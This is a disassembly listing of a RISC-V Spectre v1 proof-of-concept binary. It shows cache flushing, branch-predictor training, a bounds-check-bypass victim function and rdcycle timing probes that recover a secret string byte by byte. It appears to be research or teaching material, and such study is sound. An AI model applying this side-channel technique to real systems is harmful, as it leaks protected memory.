
bin/spectre-v1.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text:

00000000000100b0 <register_fini>:
   100b0:	ffff0797          	auipc	a5,0xffff0
   100b4:	f5078793          	addi	a5,a5,-176 # 0 <register_fini-0x100b0>
   100b8:	c799                	beqz	a5,100c6 <register_fini+0x16>
   100ba:	00003517          	auipc	a0,0x3
   100be:	b5650513          	addi	a0,a0,-1194 # 12c10 <__libc_fini_array>
   100c2:	38f0906f          	j	19c50 <atexit>
   100c6:	8082                	ret

00000000000100c8 <_start>:
   100c8:	00010197          	auipc	gp,0x10
   100cc:	cc018193          	addi	gp,gp,-832 # 1fd88 <__global_pointer$>
   100d0:	86818513          	addi	a0,gp,-1944 # 1f5f0 <_edata>
   100d4:	00028617          	auipc	a2,0x28
   100d8:	e2c60613          	addi	a2,a2,-468 # 37f00 <__BSS_END__>
   100dc:	8e09                	sub	a2,a2,a0
   100de:	4581                	li	a1,0
   100e0:	654000ef          	jal	ra,10734 <memset>
   100e4:	0000a517          	auipc	a0,0xa
   100e8:	b6c50513          	addi	a0,a0,-1172 # 19c50 <atexit>
   100ec:	c519                	beqz	a0,100fa <_start+0x32>
   100ee:	00003517          	auipc	a0,0x3
   100f2:	b2250513          	addi	a0,a0,-1246 # 12c10 <__libc_fini_array>
   100f6:	35b090ef          	jal	ra,19c50 <atexit>
   100fa:	5d0000ef          	jal	ra,106ca <__libc_init_array>
   100fe:	4502                	lw	a0,0(sp)
   10100:	002c                	addi	a1,sp,8
   10102:	4601                	li	a2,0
   10104:	2b2000ef          	jal	ra,103b6 <main>
   10108:	a355                	j	106ac <exit>

000000000001010a <__do_global_dtors_aux>:
   1010a:	89018793          	addi	a5,gp,-1904 # 1f618 <completed.5527>
   1010e:	0007c703          	lbu	a4,0(a5)
   10112:	eb0d                	bnez	a4,10144 <__do_global_dtors_aux+0x3a>
   10114:	1141                	addi	sp,sp,-16
   10116:	e022                	sd	s0,0(sp)
   10118:	e406                	sd	ra,8(sp)
   1011a:	843e                	mv	s0,a5
   1011c:	ffff0797          	auipc	a5,0xffff0
   10120:	ee478793          	addi	a5,a5,-284 # 0 <register_fini-0x100b0>
   10124:	cb89                	beqz	a5,10136 <__do_global_dtors_aux+0x2c>
   10126:	0000e517          	auipc	a0,0xe
   1012a:	2a250513          	addi	a0,a0,674 # 1e3c8 <__FRAME_END__>
   1012e:	00000097          	auipc	ra,0x0
   10132:	000000e7          	jalr	zero # 0 <register_fini-0x100b0>
   10136:	4785                	li	a5,1
   10138:	60a2                	ld	ra,8(sp)
   1013a:	00f40023          	sb	a5,0(s0)
   1013e:	6402                	ld	s0,0(sp)
   10140:	0141                	addi	sp,sp,16
   10142:	8082                	ret
   10144:	8082                	ret

0000000000010146 <frame_dummy>:
   10146:	ffff0797          	auipc	a5,0xffff0
   1014a:	eba78793          	addi	a5,a5,-326 # 0 <register_fini-0x100b0>
   1014e:	cb99                	beqz	a5,10164 <frame_dummy+0x1e>
   10150:	89818593          	addi	a1,gp,-1896 # 1f620 <object.5532>
   10154:	0000e517          	auipc	a0,0xe
   10158:	27450513          	addi	a0,a0,628 # 1e3c8 <__FRAME_END__>
   1015c:	00000317          	auipc	t1,0x0
   10160:	00000067          	jr	zero # 0 <register_fini-0x100b0>
   10164:	8082                	ret

0000000000010166 <flushCache>:
   10166:	711d                	addi	sp,sp,-96
   10168:	eca2                	sd	s0,88(sp)
   1016a:	1080                	addi	s0,sp,96
   1016c:	faa43423          	sd	a0,-88(s0)
   10170:	fab43023          	sd	a1,-96(s0)
   10174:	fa043783          	ld	a5,-96(s0)
   10178:	8399                	srli	a5,a5,0x6
   1017a:	fef43423          	sd	a5,-24(s0)
   1017e:	fa043783          	ld	a5,-96(s0)
   10182:	03f7f793          	andi	a5,a5,63
   10186:	c791                	beqz	a5,10192 <flushCache+0x2c>
   10188:	fe843783          	ld	a5,-24(s0)
   1018c:	0785                	addi	a5,a5,1
   1018e:	fef43423          	sd	a5,-24(s0)
   10192:	fe843703          	ld	a4,-24(s0)
   10196:	04000793          	li	a5,64
   1019a:	00e7f663          	bgeu	a5,a4,101a6 <flushCache+0x40>
   1019e:	04000793          	li	a5,64
   101a2:	fef43423          	sd	a5,-24(s0)
   101a6:	fc040ba3          	sb	zero,-41(s0)
   101aa:	000207b7          	lui	a5,0x20
   101ae:	e7878713          	addi	a4,a5,-392 # 1fe78 <dummyMem>
   101b2:	6791                	lui	a5,0x4
   101b4:	973e                	add	a4,a4,a5
   101b6:	77fd                	lui	a5,0xfffff
   101b8:	8ff9                	and	a5,a5,a4
   101ba:	fcf43423          	sd	a5,-56(s0)
   101be:	fe043023          	sd	zero,-32(s0)
   101c2:	a8b9                	j	10220 <flushCache+0xba>
   101c4:	fa843783          	ld	a5,-88(s0)
   101c8:	8399                	srli	a5,a5,0x6
   101ca:	03f7f713          	andi	a4,a5,63
   101ce:	fe043783          	ld	a5,-32(s0)
   101d2:	97ba                	add	a5,a5,a4
   101d4:	079a                	slli	a5,a5,0x6
   101d6:	fcf43023          	sd	a5,-64(s0)
   101da:	fc043c23          	sd	zero,-40(s0)
   101de:	a03d                	j	1020c <flushCache+0xa6>
   101e0:	fd843783          	ld	a5,-40(s0)
   101e4:	07b2                	slli	a5,a5,0xc
   101e6:	faf43c23          	sd	a5,-72(s0)
   101ea:	fc843703          	ld	a4,-56(s0)
   101ee:	fc043783          	ld	a5,-64(s0)
   101f2:	973e                	add	a4,a4,a5
   101f4:	fb843783          	ld	a5,-72(s0)
   101f8:	97ba                	add	a5,a5,a4
   101fa:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <__BSS_END__+0xfffffffffffc7100>
   101fe:	fcf40ba3          	sb	a5,-41(s0)
   10202:	fd843783          	ld	a5,-40(s0)
   10206:	0785                	addi	a5,a5,1
   10208:	fcf43c23          	sd	a5,-40(s0)
   1020c:	fd843703          	ld	a4,-40(s0)
   10210:	47bd                	li	a5,15
   10212:	fce7f7e3          	bgeu	a5,a4,101e0 <flushCache+0x7a>
   10216:	fe043783          	ld	a5,-32(s0)
   1021a:	0785                	addi	a5,a5,1
   1021c:	fef43023          	sd	a5,-32(s0)
   10220:	fe043703          	ld	a4,-32(s0)
   10224:	fe843783          	ld	a5,-24(s0)
   10228:	f8f76ee3          	bltu	a4,a5,101c4 <flushCache+0x5e>
   1022c:	0001                	nop
   1022e:	0001                	nop
   10230:	6466                	ld	s0,88(sp)
   10232:	6125                	addi	sp,sp,96
   10234:	8082                	ret

0000000000010236 <topTwoIdx>:
   10236:	7139                	addi	sp,sp,-64
   10238:	fc22                	sd	s0,56(sp)
   1023a:	0080                	addi	s0,sp,64
   1023c:	fca43c23          	sd	a0,-40(s0)
   10240:	fcb43823          	sd	a1,-48(s0)
   10244:	fcc43423          	sd	a2,-56(s0)
   10248:	fcd43023          	sd	a3,-64(s0)
   1024c:	fc043783          	ld	a5,-64(s0)
   10250:	0007b023          	sd	zero,0(a5)
   10254:	fc043783          	ld	a5,-64(s0)
   10258:	07a1                	addi	a5,a5,8
   1025a:	0007b023          	sd	zero,0(a5)
   1025e:	fe043423          	sd	zero,-24(s0)
   10262:	a075                	j	1030e <topTwoIdx+0xd8>
   10264:	fe843783          	ld	a5,-24(s0)
   10268:	078e                	slli	a5,a5,0x3
   1026a:	fd843703          	ld	a4,-40(s0)
   1026e:	97ba                	add	a5,a5,a4
   10270:	6398                	ld	a4,0(a5)
   10272:	fc043783          	ld	a5,-64(s0)
   10276:	639c                	ld	a5,0(a5)
   10278:	04e7f563          	bgeu	a5,a4,102c2 <topTwoIdx+0x8c>
   1027c:	fc043783          	ld	a5,-64(s0)
   10280:	07a1                	addi	a5,a5,8
   10282:	fc043703          	ld	a4,-64(s0)
   10286:	6318                	ld	a4,0(a4)
   10288:	e398                	sd	a4,0(a5)
   1028a:	fe843783          	ld	a5,-24(s0)
   1028e:	078e                	slli	a5,a5,0x3
   10290:	fd843703          	ld	a4,-40(s0)
   10294:	97ba                	add	a5,a5,a4
   10296:	6398                	ld	a4,0(a5)
   10298:	fc043783          	ld	a5,-64(s0)
   1029c:	e398                	sd	a4,0(a5)
   1029e:	fc843783          	ld	a5,-56(s0)
   102a2:	0785                	addi	a5,a5,1
   102a4:	fc843703          	ld	a4,-56(s0)
   102a8:	00074703          	lbu	a4,0(a4)
   102ac:	00e78023          	sb	a4,0(a5)
   102b0:	fe843783          	ld	a5,-24(s0)
   102b4:	0ff7f713          	andi	a4,a5,255
   102b8:	fc843783          	ld	a5,-56(s0)
   102bc:	00e78023          	sb	a4,0(a5)
   102c0:	a091                	j	10304 <topTwoIdx+0xce>
   102c2:	fe843783          	ld	a5,-24(s0)
   102c6:	078e                	slli	a5,a5,0x3
   102c8:	fd843703          	ld	a4,-40(s0)
   102cc:	97ba                	add	a5,a5,a4
   102ce:	6398                	ld	a4,0(a5)
   102d0:	fc043783          	ld	a5,-64(s0)
   102d4:	07a1                	addi	a5,a5,8
   102d6:	639c                	ld	a5,0(a5)
   102d8:	02e7f663          	bgeu	a5,a4,10304 <topTwoIdx+0xce>
   102dc:	fe843783          	ld	a5,-24(s0)
   102e0:	078e                	slli	a5,a5,0x3
   102e2:	fd843703          	ld	a4,-40(s0)
   102e6:	973e                	add	a4,a4,a5
   102e8:	fc043783          	ld	a5,-64(s0)
   102ec:	07a1                	addi	a5,a5,8
   102ee:	6318                	ld	a4,0(a4)
   102f0:	e398                	sd	a4,0(a5)
   102f2:	fc843783          	ld	a5,-56(s0)
   102f6:	0785                	addi	a5,a5,1
   102f8:	fe843703          	ld	a4,-24(s0)
   102fc:	0ff77713          	andi	a4,a4,255
   10300:	00e78023          	sb	a4,0(a5)
   10304:	fe843783          	ld	a5,-24(s0)
   10308:	0785                	addi	a5,a5,1
   1030a:	fef43423          	sd	a5,-24(s0)
   1030e:	fe843703          	ld	a4,-24(s0)
   10312:	fd043783          	ld	a5,-48(s0)
   10316:	f4f767e3          	bltu	a4,a5,10264 <topTwoIdx+0x2e>
   1031a:	0001                	nop
   1031c:	0001                	nop
   1031e:	7462                	ld	s0,56(sp)
   10320:	6121                	addi	sp,sp,64
   10322:	8082                	ret

0000000000010324 <victimFunc>:
   10324:	7179                	addi	sp,sp,-48
   10326:	f422                	sd	s0,40(sp)
   10328:	1800                	addi	s0,sp,48
   1032a:	fca43c23          	sd	a0,-40(s0)
   1032e:	4789                	li	a5,2
   10330:	fef407a3          	sb	a5,-17(s0)
   10334:	8401b783          	ld	a5,-1984(gp) # 1f5c8 <array1_sz>
   10338:	00479713          	slli	a4,a5,0x4
   1033c:	84e1b023          	sd	a4,-1984(gp) # 1f5c8 <array1_sz>
   10340:	8401b783          	ld	a5,-1984(gp) # 1f5c8 <array1_sz>
   10344:	fef44703          	lbu	a4,-17(s0)
   10348:	d0377753          	fcvt.s.lu	fa4,a4
   1034c:	d037f7d3          	fcvt.s.lu	fa5,a5
   10350:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   10354:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   10358:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   1035c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   10360:	c0379753          	fcvt.lu.s	a4,fa5,rtz
   10364:	84e1b023          	sd	a4,-1984(gp) # 1f5c8 <array1_sz>
   10368:	8401b783          	ld	a5,-1984(gp) # 1f5c8 <array1_sz>
   1036c:	fd843703          	ld	a4,-40(s0)
   10370:	02f77763          	bgeu	a4,a5,1039e <victimFunc+0x7a>
   10374:	67f9                	lui	a5,0x1e
   10376:	3e878713          	addi	a4,a5,1000 # 1e3e8 <__fini_array_end>
   1037a:	fd843783          	ld	a5,-40(s0)
   1037e:	97ba                	add	a5,a5,a4
   10380:	0007c783          	lbu	a5,0(a5)
   10384:	2781                	sext.w	a5,a5
   10386:	0067979b          	slliw	a5,a5,0x6
   1038a:	2781                	sext.w	a5,a5
   1038c:	00034737          	lui	a4,0x34
   10390:	eb870713          	addi	a4,a4,-328 # 33eb8 <array2>
   10394:	97ba                	add	a5,a5,a4
   10396:	0007c783          	lbu	a5,0(a5)
   1039a:	fef407a3          	sb	a5,-17(s0)
   1039e:	c00027f3          	rdcycle	a5
   103a2:	fef43023          	sd	a5,-32(s0)
   103a6:	fe043783          	ld	a5,-32(s0)
   103aa:	fef407a3          	sb	a5,-17(s0)
   103ae:	0001                	nop
   103b0:	7422                	ld	s0,40(sp)
   103b2:	6145                	addi	sp,sp,48
   103b4:	8082                	ret

00000000000103b6 <main>:
   103b6:	7171                	addi	sp,sp,-176
   103b8:	f506                	sd	ra,168(sp)
   103ba:	f122                	sd	s0,160(sp)
   103bc:	1900                	addi	s0,sp,176
   103be:	8481b703          	ld	a4,-1976(gp) # 1f5d0 <secretString>
   103c2:	67f9                	lui	a5,0x1e
   103c4:	3e878793          	addi	a5,a5,1000 # 1e3e8 <__fini_array_end>
   103c8:	40f707b3          	sub	a5,a4,a5
   103cc:	fef43423          	sd	a5,-24(s0)
   103d0:	fe0403a3          	sb	zero,-25(s0)
   103d4:	67f1                	lui	a5,0x1c
   103d6:	5b078513          	addi	a0,a5,1456 # 1c5b0 <__clzdi2+0x5c>
   103da:	4d2000ef          	jal	ra,108ac <puts>
   103de:	8481b783          	ld	a5,-1976(gp) # 1f5d0 <secretString>
   103e2:	85be                	mv	a1,a5
   103e4:	67f1                	lui	a5,0x1c
   103e6:	5f078513          	addi	a0,a5,1520 # 1c5f0 <__clzdi2+0x9c>
   103ea:	416000ef          	jal	ra,10800 <printf>
   103ee:	fc043c23          	sd	zero,-40(s0)
   103f2:	a455                	j	10696 <main+0x2e0>
   103f4:	fc043823          	sd	zero,-48(s0)
   103f8:	a005                	j	10418 <main+0x62>
   103fa:	0001f7b7          	lui	a5,0x1f
   103fe:	65078713          	addi	a4,a5,1616 # 1f650 <results.2598>
   10402:	fd043783          	ld	a5,-48(s0)
   10406:	078e                	slli	a5,a5,0x3
   10408:	97ba                	add	a5,a5,a4
   1040a:	0007b023          	sd	zero,0(a5)
   1040e:	fd043783          	ld	a5,-48(s0)
   10412:	0785                	addi	a5,a5,1
   10414:	fcf43823          	sd	a5,-48(s0)
   10418:	fd043703          	ld	a4,-48(s0)
   1041c:	0ff00793          	li	a5,255
   10420:	fce7fde3          	bgeu	a5,a4,103fa <main+0x44>
   10424:	fc043423          	sd	zero,-56(s0)
   10428:	a2b9                	j	10576 <main+0x1c0>
   1042a:	000347b7          	lui	a5,0x34
   1042e:	eb878793          	addi	a5,a5,-328 # 33eb8 <array2>
   10432:	6591                	lui	a1,0x4
   10434:	853e                	mv	a0,a5
   10436:	d31ff0ef          	jal	ra,10166 <flushCache>
   1043a:	3ff00793          	li	a5,1023
   1043e:	fcf43023          	sd	a5,-64(s0)
   10442:	a061                	j	104ca <main+0x114>
   10444:	8401b783          	ld	a5,-1984(gp) # 1f5c8 <array1_sz>
   10448:	fc843703          	ld	a4,-56(s0)
   1044c:	02f777b3          	remu	a5,a4,a5
   10450:	f8f43023          	sd	a5,-128(s0)
   10454:	fc043703          	ld	a4,-64(s0)
   10458:	43f75793          	srai	a5,a4,0x3f
   1045c:	93d9                	srli	a5,a5,0x36
   1045e:	973e                	add	a4,a4,a5
   10460:	3ff77713          	andi	a4,a4,1023
   10464:	40f707b3          	sub	a5,a4,a5
   10468:	17fd                	addi	a5,a5,-1
   1046a:	873e                	mv	a4,a5
   1046c:	77c1                	lui	a5,0xffff0
   1046e:	8ff9                	and	a5,a5,a4
   10470:	f6f43c23          	sd	a5,-136(s0)
   10474:	f7843783          	ld	a5,-136(s0)
   10478:	83c1                	srli	a5,a5,0x10
   1047a:	f7843703          	ld	a4,-136(s0)
   1047e:	8fd9                	or	a5,a5,a4
   10480:	f6f43c23          	sd	a5,-136(s0)
   10484:	fe843703          	ld	a4,-24(s0)
   10488:	f8043783          	ld	a5,-128(s0)
   1048c:	8f3d                	xor	a4,a4,a5
   1048e:	f7843783          	ld	a5,-136(s0)
   10492:	8ff9                	and	a5,a5,a4
   10494:	f8043703          	ld	a4,-128(s0)
   10498:	8fb9                	xor	a5,a5,a4
   1049a:	f6f43c23          	sd	a5,-136(s0)
   1049e:	fa043c23          	sd	zero,-72(s0)
   104a2:	a031                	j	104ae <main+0xf8>
   104a4:	fb843783          	ld	a5,-72(s0)
   104a8:	0785                	addi	a5,a5,1
   104aa:	faf43c23          	sd	a5,-72(s0)
   104ae:	fb843703          	ld	a4,-72(s0)
   104b2:	47a5                	li	a5,9
   104b4:	fee7f8e3          	bgeu	a5,a4,104a4 <main+0xee>
   104b8:	f7843503          	ld	a0,-136(s0)
   104bc:	e69ff0ef          	jal	ra,10324 <victimFunc>
   104c0:	fc043783          	ld	a5,-64(s0)
   104c4:	17fd                	addi	a5,a5,-1
   104c6:	fcf43023          	sd	a5,-64(s0)
   104ca:	fc043783          	ld	a5,-64(s0)
   104ce:	f607dbe3          	bgez	a5,10444 <main+0x8e>
   104d2:	fa043823          	sd	zero,-80(s0)
   104d6:	a069                	j	10560 <main+0x1aa>
   104d8:	fa043423          	sd	zero,-88(s0)
   104dc:	c00027f3          	rdcycle	a5
   104e0:	faf43023          	sd	a5,-96(s0)
   104e4:	fa043783          	ld	a5,-96(s0)
   104e8:	f8f43c23          	sd	a5,-104(s0)
   104ec:	fb043783          	ld	a5,-80(s0)
   104f0:	079a                	slli	a5,a5,0x6
   104f2:	00034737          	lui	a4,0x34
   104f6:	eb870713          	addi	a4,a4,-328 # 33eb8 <array2>
   104fa:	97ba                	add	a5,a5,a4
   104fc:	0007c703          	lbu	a4,0(a5) # ffffffffffff0000 <__BSS_END__+0xfffffffffffb8100>
   10500:	fe744783          	lbu	a5,-25(s0)
   10504:	8ff9                	and	a5,a5,a4
   10506:	fef403a3          	sb	a5,-25(s0)
   1050a:	c00027f3          	rdcycle	a5
   1050e:	f8f43823          	sd	a5,-112(s0)
   10512:	f9043703          	ld	a4,-112(s0)
   10516:	f9843783          	ld	a5,-104(s0)
   1051a:	40f707b3          	sub	a5,a4,a5
   1051e:	f8f43423          	sd	a5,-120(s0)
   10522:	f8843703          	ld	a4,-120(s0)
   10526:	03100793          	li	a5,49
   1052a:	02e7e663          	bltu	a5,a4,10556 <main+0x1a0>
   1052e:	0001f7b7          	lui	a5,0x1f
   10532:	65078713          	addi	a4,a5,1616 # 1f650 <results.2598>
   10536:	fb043783          	ld	a5,-80(s0)
   1053a:	078e                	slli	a5,a5,0x3
   1053c:	97ba                	add	a5,a5,a4
   1053e:	639c                	ld	a5,0(a5)
   10540:	00178713          	addi	a4,a5,1
   10544:	0001f7b7          	lui	a5,0x1f
   10548:	65078693          	addi	a3,a5,1616 # 1f650 <results.2598>
   1054c:	fb043783          	ld	a5,-80(s0)
   10550:	078e                	slli	a5,a5,0x3
   10552:	97b6                	add	a5,a5,a3
   10554:	e398                	sd	a4,0(a5)
   10556:	fb043783          	ld	a5,-80(s0)
   1055a:	0785                	addi	a5,a5,1
   1055c:	faf43823          	sd	a5,-80(s0)
   10560:	fb043703          	ld	a4,-80(s0)
   10564:	0ff00793          	li	a5,255
   10568:	f6e7f8e3          	bgeu	a5,a4,104d8 <main+0x122>
   1056c:	fc843783          	ld	a5,-56(s0)
   10570:	0785                	addi	a5,a5,1
   10572:	fcf43423          	sd	a5,-56(s0)
   10576:	fc843703          	ld	a4,-56(s0)
   1057a:	47a5                	li	a5,9
   1057c:	eae7f7e3          	bgeu	a5,a4,1042a <main+0x74>
   10580:	f6041823          	sh	zero,-144(s0)
   10584:	f6043023          	sd	zero,-160(s0)
   10588:	f6043423          	sd	zero,-152(s0)
   1058c:	f6040713          	addi	a4,s0,-160
   10590:	f7040793          	addi	a5,s0,-144
   10594:	86ba                	mv	a3,a4
   10596:	863e                	mv	a2,a5
   10598:	10000593          	li	a1,256
   1059c:	0001f7b7          	lui	a5,0x1f
   105a0:	65078513          	addi	a0,a5,1616 # 1f650 <results.2598>
   105a4:	c93ff0ef          	jal	ra,10236 <topTwoIdx>
   105a8:	f7044683          	lbu	a3,-144(s0)
   105ac:	8481b703          	ld	a4,-1976(gp) # 1f5d0 <secretString>
   105b0:	fd843783          	ld	a5,-40(s0)
   105b4:	97ba                	add	a5,a5,a4
   105b6:	0007c783          	lbu	a5,0(a5)
   105ba:	8736                	mv	a4,a3
   105bc:	00f70e63          	beq	a4,a5,105d8 <main+0x222>
   105c0:	f7144683          	lbu	a3,-143(s0)
   105c4:	8481b703          	ld	a4,-1976(gp) # 1f5d0 <secretString>
   105c8:	fd843783          	ld	a5,-40(s0)
   105cc:	97ba                	add	a5,a5,a4
   105ce:	0007c783          	lbu	a5,0(a5)
   105d2:	8736                	mv	a4,a3
   105d4:	04f71d63          	bne	a4,a5,1062e <main+0x278>
   105d8:	fe843703          	ld	a4,-24(s0)
   105dc:	67f9                	lui	a5,0x1e
   105de:	3e878793          	addi	a5,a5,1000 # 1e3e8 <__fini_array_end>
   105e2:	00f705b3          	add	a1,a4,a5
   105e6:	8481b703          	ld	a4,-1976(gp) # 1f5d0 <secretString>
   105ea:	fd843783          	ld	a5,-40(s0)
   105ee:	97ba                	add	a5,a5,a4
   105f0:	0007c783          	lbu	a5,0(a5)
   105f4:	0007861b          	sext.w	a2,a5
   105f8:	f6043683          	ld	a3,-160(s0)
   105fc:	f7044783          	lbu	a5,-144(s0)
   10600:	0007871b          	sext.w	a4,a5
   10604:	f7044783          	lbu	a5,-144(s0)
   10608:	0007851b          	sext.w	a0,a5
   1060c:	f6843803          	ld	a6,-152(s0)
   10610:	f7144783          	lbu	a5,-143(s0)
   10614:	0007889b          	sext.w	a7,a5
   10618:	f7144783          	lbu	a5,-143(s0)
   1061c:	2781                	sext.w	a5,a5
   1061e:	e03e                	sd	a5,0(sp)
   10620:	87aa                	mv	a5,a0
   10622:	6571                	lui	a0,0x1c
   10624:	60850513          	addi	a0,a0,1544 # 1c608 <__clzdi2+0xb4>
   10628:	1d8000ef          	jal	ra,10800 <printf>
   1062c:	a899                	j	10682 <main+0x2cc>
   1062e:	fe843703          	ld	a4,-24(s0)
   10632:	67f9                	lui	a5,0x1e
   10634:	3e878793          	addi	a5,a5,1000 # 1e3e8 <__fini_array_end>
   10638:	00f705b3          	add	a1,a4,a5
   1063c:	8481b703          	ld	a4,-1976(gp) # 1f5d0 <secretString>
   10640:	fd843783          	ld	a5,-40(s0)
   10644:	97ba                	add	a5,a5,a4
   10646:	0007c783          	lbu	a5,0(a5)
   1064a:	0007861b          	sext.w	a2,a5
   1064e:	f6043683          	ld	a3,-160(s0)
   10652:	f7044783          	lbu	a5,-144(s0)
   10656:	0007871b          	sext.w	a4,a5
   1065a:	f7044783          	lbu	a5,-144(s0)
   1065e:	0007851b          	sext.w	a0,a5
   10662:	f6843803          	ld	a6,-152(s0)
   10666:	f7144783          	lbu	a5,-143(s0)
   1066a:	0007889b          	sext.w	a7,a5
   1066e:	f7144783          	lbu	a5,-143(s0)
   10672:	2781                	sext.w	a5,a5
   10674:	e03e                	sd	a5,0(sp)
   10676:	87aa                	mv	a5,a0
   10678:	6571                	lui	a0,0x1c
   1067a:	66850513          	addi	a0,a0,1640 # 1c668 <__clzdi2+0x114>
   1067e:	182000ef          	jal	ra,10800 <printf>
   10682:	fe843783          	ld	a5,-24(s0)
   10686:	0785                	addi	a5,a5,1
   10688:	fef43423          	sd	a5,-24(s0)
   1068c:	fd843783          	ld	a5,-40(s0)
   10690:	0785                	addi	a5,a5,1
   10692:	fcf43c23          	sd	a5,-40(s0)
   10696:	fd843703          	ld	a4,-40(s0)
   1069a:	47e5                	li	a5,25
   1069c:	d4e7fce3          	bgeu	a5,a4,103f4 <main+0x3e>
   106a0:	4781                	li	a5,0
   106a2:	853e                	mv	a0,a5
   106a4:	70aa                	ld	ra,168(sp)
   106a6:	740a                	ld	s0,160(sp)
   106a8:	614d                	addi	sp,sp,176
   106aa:	8082                	ret

00000000000106ac <exit>:
   106ac:	1141                	addi	sp,sp,-16
   106ae:	4581                	li	a1,0
   106b0:	e022                	sd	s0,0(sp)
   106b2:	e406                	sd	ra,8(sp)
   106b4:	842a                	mv	s0,a0
   106b6:	03c020ef          	jal	ra,126f2 <__call_exitprocs>
   106ba:	8301b503          	ld	a0,-2000(gp) # 1f5b8 <_global_impure_ptr>
   106be:	6d3c                	ld	a5,88(a0)
   106c0:	c391                	beqz	a5,106c4 <exit+0x18>
   106c2:	9782                	jalr	a5
   106c4:	8522                	mv	a0,s0
   106c6:	0bf0a0ef          	jal	ra,1af84 <_exit>

00000000000106ca <__libc_init_array>:
   106ca:	1101                	addi	sp,sp,-32
   106cc:	e822                	sd	s0,16(sp)
   106ce:	e04a                	sd	s2,0(sp)
   106d0:	0000e417          	auipc	s0,0xe
   106d4:	cfc40413          	addi	s0,s0,-772 # 1e3cc <__preinit_array_end>
   106d8:	0000e917          	auipc	s2,0xe
   106dc:	cf490913          	addi	s2,s2,-780 # 1e3cc <__preinit_array_end>
   106e0:	40890933          	sub	s2,s2,s0
   106e4:	ec06                	sd	ra,24(sp)
   106e6:	e426                	sd	s1,8(sp)
   106e8:	40395913          	srai	s2,s2,0x3
   106ec:	00090963          	beqz	s2,106fe <__libc_init_array+0x34>
   106f0:	4481                	li	s1,0
   106f2:	601c                	ld	a5,0(s0)
   106f4:	0485                	addi	s1,s1,1
   106f6:	0421                	addi	s0,s0,8
   106f8:	9782                	jalr	a5
   106fa:	fe991ce3          	bne	s2,s1,106f2 <__libc_init_array+0x28>
   106fe:	0000e417          	auipc	s0,0xe
   10702:	cd240413          	addi	s0,s0,-814 # 1e3d0 <__init_array_start>
   10706:	0000e917          	auipc	s2,0xe
   1070a:	cda90913          	addi	s2,s2,-806 # 1e3e0 <__init_array_end>
   1070e:	40890933          	sub	s2,s2,s0
   10712:	40395913          	srai	s2,s2,0x3
   10716:	00090963          	beqz	s2,10728 <__libc_init_array+0x5e>
   1071a:	4481                	li	s1,0
   1071c:	601c                	ld	a5,0(s0)
   1071e:	0485                	addi	s1,s1,1
   10720:	0421                	addi	s0,s0,8
   10722:	9782                	jalr	a5
   10724:	fe991ce3          	bne	s2,s1,1071c <__libc_init_array+0x52>
   10728:	60e2                	ld	ra,24(sp)
   1072a:	6442                	ld	s0,16(sp)
   1072c:	64a2                	ld	s1,8(sp)
   1072e:	6902                	ld	s2,0(sp)
   10730:	6105                	addi	sp,sp,32
   10732:	8082                	ret

0000000000010734 <memset>:
   10734:	433d                	li	t1,15
   10736:	872a                	mv	a4,a0
   10738:	02c37163          	bgeu	t1,a2,1075a <memset+0x26>
   1073c:	00f77793          	andi	a5,a4,15
   10740:	e3c1                	bnez	a5,107c0 <memset+0x8c>
   10742:	e1bd                	bnez	a1,107a8 <memset+0x74>
   10744:	ff067693          	andi	a3,a2,-16
   10748:	8a3d                	andi	a2,a2,15
   1074a:	96ba                	add	a3,a3,a4
   1074c:	e30c                	sd	a1,0(a4)
   1074e:	e70c                	sd	a1,8(a4)
   10750:	0741                	addi	a4,a4,16
   10752:	fed76de3          	bltu	a4,a3,1074c <memset+0x18>
   10756:	e211                	bnez	a2,1075a <memset+0x26>
   10758:	8082                	ret
   1075a:	40c306b3          	sub	a3,t1,a2
   1075e:	068a                	slli	a3,a3,0x2
   10760:	00000297          	auipc	t0,0x0
   10764:	9696                	add	a3,a3,t0
   10766:	00a68067          	jr	10(a3)
   1076a:	00b70723          	sb	a1,14(a4)
   1076e:	00b706a3          	sb	a1,13(a4)
   10772:	00b70623          	sb	a1,12(a4)
   10776:	00b705a3          	sb	a1,11(a4)
   1077a:	00b70523          	sb	a1,10(a4)
   1077e:	00b704a3          	sb	a1,9(a4)
   10782:	00b70423          	sb	a1,8(a4)
   10786:	00b703a3          	sb	a1,7(a4)
   1078a:	00b70323          	sb	a1,6(a4)
   1078e:	00b702a3          	sb	a1,5(a4)
   10792:	00b70223          	sb	a1,4(a4)
   10796:	00b701a3          	sb	a1,3(a4)
   1079a:	00b70123          	sb	a1,2(a4)
   1079e:	00b700a3          	sb	a1,1(a4)
   107a2:	00b70023          	sb	a1,0(a4)
   107a6:	8082                	ret
   107a8:	0ff5f593          	andi	a1,a1,255
   107ac:	00859693          	slli	a3,a1,0x8
   107b0:	8dd5                	or	a1,a1,a3
   107b2:	01059693          	slli	a3,a1,0x10
   107b6:	8dd5                	or	a1,a1,a3
   107b8:	02059693          	slli	a3,a1,0x20
   107bc:	8dd5                	or	a1,a1,a3
   107be:	b759                	j	10744 <memset+0x10>
   107c0:	00279693          	slli	a3,a5,0x2
   107c4:	00000297          	auipc	t0,0x0
   107c8:	9696                	add	a3,a3,t0
   107ca:	8286                	mv	t0,ra
   107cc:	fa2680e7          	jalr	-94(a3)
   107d0:	8096                	mv	ra,t0
   107d2:	17c1                	addi	a5,a5,-16
   107d4:	8f1d                	sub	a4,a4,a5
   107d6:	963e                	add	a2,a2,a5
   107d8:	f8c371e3          	bgeu	t1,a2,1075a <memset+0x26>
   107dc:	b79d                	j	10742 <memset+0xe>

00000000000107de <_printf_r>:
   107de:	715d                	addi	sp,sp,-80
   107e0:	f032                	sd	a2,32(sp)
   107e2:	f436                	sd	a3,40(sp)
   107e4:	f83a                	sd	a4,48(sp)
   107e6:	fc3e                	sd	a5,56(sp)
   107e8:	e0c2                	sd	a6,64(sp)
   107ea:	e4c6                	sd	a7,72(sp)
   107ec:	862e                	mv	a2,a1
   107ee:	690c                	ld	a1,16(a0)
   107f0:	1014                	addi	a3,sp,32
   107f2:	ec06                	sd	ra,24(sp)
   107f4:	e436                	sd	a3,8(sp)
   107f6:	152000ef          	jal	ra,10948 <_vfprintf_r>
   107fa:	60e2                	ld	ra,24(sp)
   107fc:	6161                	addi	sp,sp,80
   107fe:	8082                	ret

0000000000010800 <printf>:
